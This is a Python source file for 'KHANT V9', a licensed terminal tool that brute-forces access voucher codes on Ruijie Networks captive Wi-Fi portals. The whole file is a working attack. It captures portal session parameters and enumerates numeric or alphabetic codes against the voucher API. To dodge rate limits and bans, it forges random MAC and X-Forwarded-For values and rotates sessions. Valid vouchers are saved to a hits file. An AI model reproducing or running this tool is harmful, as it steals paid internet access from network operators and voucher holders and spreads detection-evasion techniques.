# =====================================================================
# khant_v9.py - KHANT V9 (FIXED DASHBOARD + REAL-TIME TIMER + NO BUGS)
# PART 1
# =====================================================================
import os, time, random, string, json, asyncio, socket, threading, re, sys, uuid
import urllib3, requests, aiohttp
from collections import deque
from urllib.parse import urlparse, parse_qs, quote, unquote
from rich.console import Console, Group
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.table import Table
from rich.align import Align

try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 10        # Ban မခံရအောင် ၁၀ ခုပဲ ထားတယ်
TIMEOUT = 5                   # Timeout ကို ၅ စက္ကန့်ထားတယ်
SESSION_TTL = 280             # Ruijie sign expire ~300s
RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_MM_BASE = "https://portal-mm-as.ruijienetworks.com"
RUIJIE_WIFIDOG = "/api/auth/wifidog"
RUIJIE_VOUCHER = "/api/auth/voucher/?lang=en_US"

APP_NAME = "KHANT V9"
APP_TAG  = "@khant7997"

console = Console()
tried_codes = set()
code_lock = threading.Lock()
LICENSE_INFO = {"status": "Unverified"}

# ---------- helpers ----------
def generate_random_mac():
    return "00:16:3e:%02x:%02x:%02x" % (
        random.randint(0, 0x7f), random.randint(0, 0xff), random.randint(0, 0xff))

def generate_random_ip():
    return f"192.168.110.{random.randint(2, 254)}"

def get_real_mac_and_ip():
    ip = "127.0.0.1"
    mac = "00:00:00:00:00:00"
    try:
        mac_raw = uuid.getnode()
        mac = ':'.join(['{:02x}'.format((mac_raw >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        pass
    return mac, ip

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(s):
    try:
        s = int(s); return f"{s//3600:02d}:{(s%3600)//60:02d}:{s%60:02d}"
    except: return "00:00:00"

def epoch_ms_to_plan(ms, flow_bytes=0):
    try:
        ms = int(ms)
        if ms <= 0: return "N/A"
        now = int(time.time()*1000)
        remain_s = max(0, (ms - now)//1000)
        flow_gb = round(int(flow_bytes)/(1024**3), 2) if flow_bytes else 0
        tail = f" | {flow_gb}GB" if flow_gb else ""
        return f"{remain_s//3600}h{(remain_s%3600)//60}m{remain_s%60}s{tail}"
    except: return "N/A"

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        p = ip.split("."); p[-1] = "1"; return ".".join(p)
    except: return "192.168.110.1"

def check_license():
    if not HAS_LICENSE_MODULE: return False, "license.py မရှိ"
    try:
        r = _license.check_approval()
        if isinstance(r, tuple): return r
        return bool(r), "Valid" if r else "Invalid"
    except Exception as e: return False, str(e)

def activate_license(k):
    if not HAS_LICENSE_MODULE: return False, "license.py မရှိ"
    try: return _license.activate(k)
    except Exception as e: return False, str(e)

# ---------- portal detect (FULLY AUTO) ----------
def detect_and_capture():
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"})
    
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://detectportal.firefox.com/success.txt",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for probe in probes:
        try:
            r = s.get(probe, allow_redirects=True, timeout=6, verify=False)
            if "ruijienetworks" in r.url or "ruijienet" in r.text.lower():
                console.print(f"[green][+] Auto-captured portal: {r.url[:80]}[/green]")
                return r.url
        except Exception: continue

    gateways = [get_gateway_ip(), "192.168.110.1", "10.44.77.254", "192.168.7.1", "192.168.1.1"]
    for gw in dict.fromkeys(gateways):
        try:
            r = s.get(f"http://{gw}", timeout=4, allow_redirects=True)
            if "ruijienetworks" in r.url:
                console.print(f"[green][+] Auto-captured via gateway {gw}[/green]")
                return r.url
        except Exception: pass

    for base in [RUIJIE_MM_BASE, RUIJIE_BASE]:
        try:
            r = s.get(base, timeout=6, verify=False, allow_redirects=True)
            if "ruijienetworks" in r.url:
                console.print(f"[green][+] Auto-captured base portal: {r.url[:80]}[/green]")
                return r.url
        except Exception: pass

    console.print("[yellow][!] Auto-capture failed, using default portal settings.[/yellow]")
    return None

def build_gw_params(portal_url):
    p = {
        "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
        "gw_address": "192.168.7.1", "gw_port": "2060", "nasip": "192.168.1.193",
        "ssid": "VLAN7", "slot_num": "14", "ustate": "0", "mac_req": "1",
        "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067",
        "url": RUIJIE_BASE,
    }
    if not portal_url:
        return p
    
    q = parse_qs(urlparse(portal_url).query)
    for k in ("gw_id","gw_sn","gw_address","gw_port","nasip","slot_num","ssid",
              "chap_id","chap_challenge","stage","ustate","mac_req","url","gw_mac"):
        if q.get(k): p[k] = unquote(q[k][0])
    
    if q.get("gw_mac"): p["gw_mac"] = q["gw_mac"][0]
    
    if "portal-mm" in portal_url:
        p["url"] = RUIJIE_MM_BASE
    else:
        p["url"] = RUIJIE_BASE
        
    console.print(f"[cyan][+] Params: gw_id={p['gw_id']} nasip={p['nasip']} ssid={p['ssid']}[/cyan]")
    return p
# ---------- real session ----------
async def fetch_real_session(session, gw_params, mac, ip):
    base = gw_params.get("url", RUIJIE_BASE) + RUIJIE_WIFIDOG
    p = dict(gw_params); p["mac"] = mac; p["ip"] = ip
    qs = "&".join(f"{k}={quote(str(v), safe='')}" for k,v in p.items())
    url = f"{base}?{qs}"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
        "Client-Mac": mac, 
        "X-Forwarded-For": ip, 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    }
    try:
        async with session.get(url, headers=headers, timeout=10, allow_redirects=False) as r:
            if r.status == 429: return ("BAN", "429")
            loc = r.headers.get("Location","")
            if not loc:
                body = await r.text()
                m = re.search(r'(https?://[^\s"\'<>]+sessionId=[^\s"\'<>]+)', body)
                if m: loc = m.group(1)
                
            if loc:
                ll = loc.lower()
                if any(x in ll for x in ("request limited","error.html","errormsg","banned")):
                    return ("BAN", "banned")
                q2 = parse_qs(urlparse(unquote(loc)).query)
                sid = q2.get("sessionId",[None])[0]
                if sid:
                    return ("REAL", {
                        "sessionId": sid,
                        "sign":      q2.get("sign",[None])[0],
                        "timestamp": q2.get("timestamp",[None])[0],
                        "logonUrl":  (q2.get("logonUrl",[None])[0] or ""),
                        "acquired":  time.time(),
                    })
                return ("NO_SESS", "Redirect ပါလာပေမယ့် sid မပါဘူး")
            return ("NO_SESS", f"HTTP {r.status} - Browser နဲ့ အရင် Portal ဝင်ပါ")
    except asyncio.TimeoutError: 
        return ("NET", "Timeout")
    except Exception as e:   
        return ("NET", f"Err:{type(e).__name__}")

# ---------- test voucher ----------
async def test_code(session, sess, code, temp_mac, temp_ip):
    url = sess["url_base"] + RUIJIE_VOUCHER
    if sess.get("sign") and sess.get("timestamp"):
        url += f"&sign={sess['sign']}&timestamp={sess['timestamp']}"
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12)",
        "referer": f"{sess['url_base']}/download/static/maccauth/src/index.html?sessionId={sess['sessionId']}",
        "Client-Mac": temp_mac, "X-Forwarded-For": temp_ip,
    }
    payload = {"accessCode": code, "sessionId": sess["sessionId"], "apiVersion": 1}

    try:
        async with session.post(url, json=payload, headers=headers, timeout=TIMEOUT, allow_redirects=False) as r:
            if r.status == 429: return "__RATE_LIMITED__", "N/A"
            text = await r.text()
            if not text: return "__NETWORK_ERROR__", "N/A"
            low = text.lower()
            if "request limited" in low or "too many" in low: return "__RATE_LIMITED__", "N/A"
            if "session timed out" in low or "invalid session" in low: return "__SESSION_EXPIRED__", "N/A"

            real_plan = "N/A"; is_hit = False
            try:
                j = json.loads(text)
                if j.get("success") is True or j.get("code") == 200:
                    is_hit = True
                    rd = j.get("result", {})
                    if isinstance(rd, dict):
                        exp = rd.get("expireTime") or rd.get("expire_time")
                        flow = rd.get("flow") or rd.get("bytes") or 0
                        if exp: real_plan = epoch_ms_to_plan(exp, flow)
                        elif rd.get("duration"): real_plan = f"{rd['duration']}s"
            except Exception:
                if '"success":true' in low or "congratulations" in low: is_hit = True
            return ("HIT" if is_hit else text), real_plan
    except asyncio.TimeoutError: return "__TIMEOUT__", "N/A"
    except Exception as e: return f"__ERROR__:{type(e).__name__}", "N/A"

# ---------- code gen ----------
_CHARSETS = {"num": string.digits, "eng": string.ascii_lowercase, "mix": string.ascii_lowercase + string.digits}
seq_counter = 1
seq_lock = threading.Lock()

def gen_code(mode, length, scan_method="random"):
    chars = _CHARSETS.get(mode)
    if not chars: return ""
    space = len(chars) ** length
    global seq_counter

    if scan_method == "sequential":
        with seq_lock:
            n = seq_counter; seq_counter += 1
        if n >= space: return None
        base = len(chars); out = []
        for _ in range(length):
            out.append(chars[n % base]); n //= base
        return "".join(reversed(out))

    if len(tried_codes) >= space: return None
    with code_lock:
        use_set = space <= 500_000
        for _ in range(50):
            c = "".join(random.choices(chars, k=length))
            if not use_set or c not in tried_codes:
                if use_set: tried_codes.add(c)
                return c
        return None

# ---------- dashboard (FIXED LAYOUT) ----------
def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
                speed, mac, ip, sess_stat, sess_id, total):
    progress = min(100.0, (tested/total)*100) if total else 0.0
    
    header = Panel(Align.center(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_cyan")), 
                   border_style="cyan", box=ROUNDED, height=3)

    stat_style = "bold red" if any(x in status.upper() for x in ("ERR","TIMEOUT","BAN","EXHAUST", "FAIL", "CHECK")) else "bold green"
    sess_style = {"REAL":"bold green","EXPIRED":"bold red","BANNED":"bold red","HIT":"bold bright_green"}.get(sess_stat,"bold cyan")
    sess_txt = f"{sess_stat} ({(sess_id or '')[:8]})" if sess_id and sess_id != "--------" else sess_stat

    tbl = Table.grid(expand=True, padding=(0,1))
    for _ in range(4): tbl.add_column(style="bold white", justify="left")
    tbl.add_row("  📅 Expiry",  f": {LICENSE_INFO['status']}", "  ⏱ Timer",    f": {elapsed}")
    tbl.add_row("  🎯 Mode",    f": {mode_str}",               "  📊 Tested",   f": {tested:,}")
    tbl.add_row("  ⚡ Speed",   f": {int(speed)} c/m",         "  📡 Status",   f": {status}", style=stat_style)
    tbl.add_row("  🔑 Hits",    f": {len(hits)}",              "  📌 Engine",   f": {scan_method.upper()}")
    tbl.add_row("  🖥 MAC",      f": ...{mac[-8:]}",            "  🌐 IP",       f": ...{ip[-3:]}")
    tbl.add_row("  🔐 Session", f": {sess_txt}",               "  📈 Progress", f": {progress:.2f}%", style=sess_style)

    tbl_panel = Panel(tbl, border_style="magenta", box=ROUNDED, height=7)
    code_panel = Panel(Align.center(Text(f"Check Code : {cur_code or '------'}", style="bold yellow")),
                       border_style="yellow", box=ROUNDED, height=3)

    vt = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
    vt.add_column("Voucher", style="bold green", justify="center")
    vt.add_column("Real Plan", style="bold green", justify="center")
    vt.add_column("Time", style="bold cyan", justify="center")

    for h in list(hits)[-5:]:
        vt.add_row(h.get('code',''), h.get('plan','N/A'), h.get('time',''))
    if not hits: vt.add_row("—","—","—")

    footer = Panel(Align.center(Text(f"✨ Thank You {APP_TAG} ✨", style="bold bright_yellow")),
                   border_style="red", box=ROUNDED, height=3)

    return Group(
        header,
        tbl_panel,
        code_panel,
        vt,
        footer
    )

# ---------- scan loop ----------
async def scan_loop_async(mode, length, scan_method, gw_params):
    global seq_counter, tried_codes
    tried_codes.clear()
    seq_counter = 1

    total_target = {"num": 10**length, "eng": 26**length, "mix": 36**length}.get(mode, 1000000)
    mode_str = f"{mode.upper()}-{length}"

    hits = deque(maxlen=500)
    tested = 0
    start = time.time()

    cur_code = ""
    status = "Init"
    sess_stat = "NONE"
    sess_id = "--------"
    real_mac, real_ip = get_real_mac_and_ip()
    mac = real_mac
    ip  = real_ip
    sess = None
    sess_time = 0.0
    fail_count = 0

    sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
    conn = aiohttp.TCPConnector(limit=50, ssl=False, force_close=False)

    # Timer ကို ၁ စက္ကန့်တစ်ခါ အလုပ်လုပ်အောင် ဖန်တီးခြင်း
    async def timer_task():
        while True:
            elapsed = time.time() - start
            live.update(render_dash(mode_str, scan_method, cur_code, tested,
                format_time(elapsed), status, hits, (tested/max(1,elapsed))*60, 
                mac, ip, sess_stat, sess_id, total_target))
            await asyncio.sleep(1)

    async with aiohttp.ClientSession(connector=conn) as session:
        live = Live(
            render_dash(mode_str, scan_method, cur_code, tested, "00:00:00",
                        status, hits, 0.0, mac, ip, sess_stat, sess_id, total_target),
            refresh_per_second=8, console=console,
        )
        live.start(refresh=True)
        
        timer = asyncio.create_task(timer_task())

        try:
            while True:
                if sess is None or (time.time() - sess_time) > SESSION_TTL:
                    status = "Fetching session…"
                    tag, payload = await fetch_real_session(session, gw_params, real_mac, real_ip)
                    
                    if tag == "REAL":
                        sess = payload
                        sess["url_base"] = gw_params.get("url", RUIJIE_BASE)
                        sess_stat = "REAL"
                        sess_id = sess["sessionId"]
                        sess_time = time.time()
                        status = "Active"
                        fail_count = 0
                    elif tag == "BAN":
                        sess_stat = "BANNED"; sess = None
                        status = "IP Banned. Wait…"
                        await asyncio.sleep(10)
                        continue
                    else:
                        sess_stat = "FAIL"; sess = None
                        status = f"Fail: {payload}" 
                        fail_count += 1
                        if fail_count >= 3:
                            status = "Wi-Fi ကို Browser နဲ့ အရင်ဝင်ပါ"
                            await asyncio.sleep(5)
                            fail_count = 0
                        else:
                            await asyncio.sleep(2)
                        continue

                batch = []
                exhausted = False
                while len(batch) < CONCURRENCY_LIMIT:
                    c = gen_code(mode, length, scan_method)
                    if c is None:
                        exhausted = True
                        break
                    if c and c not in batch:
                        batch.append(c)
                if exhausted and not batch:
                    status = "EXHAUSTED"
                    break
                if not batch:
                    await asyncio.sleep(0.05); continue

                async def _run(code):
                    async with sem:
                        temp_mac = generate_random_mac()
                        temp_ip = generate_random_ip()
                        return await test_code(session, sess, code, temp_mac, temp_ip)

                results = await asyncio.gather(*[_run(c) for c in batch], return_exceptions=True)

                refresh_session = False
                for idx, r in enumerate(results):
                    tested += 1
                    code = batch[idx]
                    cur_code = code

                    if isinstance(r, Exception): continue
                    res, plan = r

                    if res == "__SESSION_EXPIRED__":
                        refresh_session = True; sess_stat = "EXPIRED"; break
                    if res == "__RATE_LIMITED__":
                        refresh_session = True; sess_stat = "BANNED"; status = "429 → rotate"
                        await asyncio.sleep(2); break
                    if res.startswith("__"): continue

                    if res == "HIT":
                        ts = time.strftime("%H:%M:%S")
                        hits.append({"code": code, "plan": plan, "time": ts})
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{ts}] {code} | {plan}\n")
                        except Exception: pass
                        refresh_session = True
                        sess_stat = "HIT"
                        break

                if refresh_session:
                    sess = None; sess_time = 0.0

                await asyncio.sleep(0.05) 

        except (KeyboardInterrupt, asyncio.CancelledError):
            status = "Stopped"
        finally:
            timer.cancel()
            live.stop()

        console.print(Panel(
            Align.center(Text(f"✅ Done • Tested {tested:,} • Hits {len(hits)}", style="bold bright_green")),
            border_style="green", box=ROUNDED))

# ---------- menus & main ----------
def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number   (0-9)")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet (a-z)")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed    (a-z0-9)")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if c == "0": return None
        if c in ("1","2","3"): return {"1":"num","2":"eng","3":"mix"}[c]

def ask_length(mode):
    lengths = (6, 7, 8, 9)
    while True:
        show_banner()
        console.print(f"  [bold bright_white]Mode {mode.upper()} — Length[/bold bright_white]\n")
        for i, L in enumerate(lengths, 1):
            console.print(f"  [bold bright_cyan]{i}.[/bold bright_cyan] {L} chars")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if c == "0": return None
        if c in [str(i) for i in range(1, len(lengths)+1)]:
            return lengths[int(c)-1]

def ask_scan():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential\n")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if c == "0": return None
        if c in ("1","2"): return {"1":"random","2":"sequential"}[c]

def run():
    global LICENSE_INFO
    show_banner()

    ok, msg = check_license()
    while not ok:
        clear_screen()
        console.print(Panel(Align.center(Text("🔐 Enter License Key (or 'q' to quit)", style="bold yellow")), border_style="yellow"))
        k = Prompt.ask("  ➜ Key").strip()
        if k.lower() in ("q", "quit", "exit"):
            console.print("[bold red]Cancelled.[/bold red]")
            sys.exit(0)
        if not k: continue
        ok2, m2 = activate_license(k)
        console.print(Panel(Align.center(Text(m2, style="bold green" if ok2 else "bold red")), border_style="green" if ok2 else "red"))
        time.sleep(2)
        ok, msg = check_license()
    LICENSE_INFO["status"] = msg

    portal_url = detect_and_capture()
    gw_params = build_gw_params(portal_url)

    while True:
        mode = ask_mode()
        if mode is None: break
        length = ask_length(mode)
        if length is None: continue
        scan_m = ask_scan()
        if scan_m is None: continue

        try:
            asyncio.run(scan_loop_async(mode, length, scan_m, gw_params))
        except KeyboardInterrupt:
            pass
        except Exception as e:
            console.print(f"[bold red]Error: {e}[/bold red]")
            time.sleep(2)

def main():
    try: run()
    except (KeyboardInterrupt, EOFError):
        console.print("\n[bold red]Exiting...[/bold red]")
    finally:
        try:
            console.print()
            console.print(Text(f"✨ {APP_TAG} Tools ✨", style="bold bright_green"), justify="center")
        except Exception: pass
        time.sleep(1)

if __name__ == "__main__":
    main()